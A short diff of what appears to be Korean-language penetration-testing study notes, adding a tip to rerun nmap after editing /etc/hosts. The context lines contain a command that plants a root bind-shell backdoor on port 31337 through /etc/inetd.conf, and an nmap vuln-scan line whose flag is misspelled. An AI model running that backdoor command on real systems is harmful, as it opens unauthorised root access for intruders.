@@ -24,3 +24,4 @@ echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf"
 sudo nmap --scrip vuln <ip>
 ```
 - 취약점을 찾기 어려울 때 nmap 실행해서 확인
+- /etc/hosts에 등록하고 난 뒤에 nmap 한번 더 실행해주기.
